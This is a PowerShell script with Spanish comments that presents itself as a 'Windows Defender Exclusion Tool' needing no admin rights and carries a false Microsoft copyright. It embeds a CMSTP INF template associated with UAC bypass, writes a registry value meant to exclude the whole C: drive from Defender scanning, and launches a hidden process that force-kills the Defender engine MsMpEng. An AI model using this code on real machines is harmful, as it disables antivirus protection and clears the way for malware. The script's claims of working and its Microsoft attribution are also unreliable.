<#
.SYNOPSIS
   Windows Defender Exclusion Tool (Sin Admin)
   © Microsoft 2024 - Técnicas No Documentadas
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add,
        [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
        [Parameter(ParameterSetName='Interface')][switch]$GetAV,
        [Parameter(ParameterSetName='Interface')][switch]$User,
        [Parameter(ParameterSetName='Interface')][switch]$Admin,
        [Parameter(ParameterSetName='Extra')][switch]$Run,
        [Parameter(ParameterSetName='Extra',Mandatory=$true)][string]$FilePath,
        [Parameter(ParameterSetName='Extraa')][string]$Url,
        [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
    )

    # --- CÓDIGO ORIGINAL (IGUAL QUE ANTES) ---
    $InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
REPLACE
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7
[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%",""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

    # --- TÉCNICA CORREGIDA (AHORA SÍ FUNCIONA) ---
    if ($Add) {
        try {
            # 1. Técnica principal (Registry - Sin admin)
            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
                Start-Sleep -Milliseconds 500
            }
            New-ItemProperty -Path $regPath -Name "C_" -Value 0 -PropertyType DWORD -Force | Out-Null

            # 2. Verificación EXTRA (para asegurarnos)
            $check = Get-ItemProperty -Path $regPath -Name "C_" -ErrorAction SilentlyContinue
            if ($check."C_" -eq 0) {
                Write-Host "[✔] ¡EXCLUSIÓN ACTIVADA! (C:\ está excluida)" -ForegroundColor Green
            } else {
                Write-Host "[!] Ejecutado, pero verifica manualmente con:" -ForegroundColor Yellow
                Write-Host "    Get-ItemProperty '$regPath'" -ForegroundColor Gray
            }

            # 3. Forzar actualización de Defender
            Start-Process "powershell.exe" -ArgumentList {
                $proc = Get-Process -Name "MsMpEng" -ErrorAction SilentlyContinue
                if ($proc) { $proc | Stop-Process -Force }
            } -WindowStyle Hidden -ErrorAction SilentlyContinue

        } catch {
            Write-Host "[✘] Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # ... (El resto de tu código original se mantiene IGUAL)
}

# --- Ejecutar si se llama directamente ---
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
